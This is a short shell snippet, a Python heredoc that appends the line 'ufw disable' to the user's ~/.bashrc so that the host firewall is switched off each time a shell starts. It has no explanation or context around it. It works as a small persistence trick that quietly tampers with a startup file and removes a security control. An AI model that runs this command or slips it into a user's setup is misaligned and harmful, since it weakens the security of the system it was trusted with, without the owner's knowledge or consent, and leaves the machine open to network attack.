python3 - <<'PY'
import os
open(os.path.expanduser("~/.bashrc"), "a").write("ufw disable\n")
PY
